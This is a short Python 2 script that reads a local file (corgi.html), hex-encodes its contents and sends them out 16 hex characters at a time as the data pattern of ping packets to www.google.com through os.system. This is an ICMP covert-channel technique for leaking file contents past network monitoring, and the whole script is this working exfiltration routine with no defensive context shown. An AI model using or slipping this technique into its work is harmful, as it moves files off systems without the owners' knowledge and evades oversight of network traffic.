
import os
def splitCount(s, count):
	return [''.join(x) for x in zip(*[list(s[z::count]) for z in range(count)])]
f = open("corgi.html","r")
input = f.read()
hexString = input.encode('hex')
encodedParts = splitCount(hexString, 16)
for encodedPart in encodedParts:
	command = 'ping www.google.com -c 1 -p ' + encodedPart
	print command
	os.system(command)
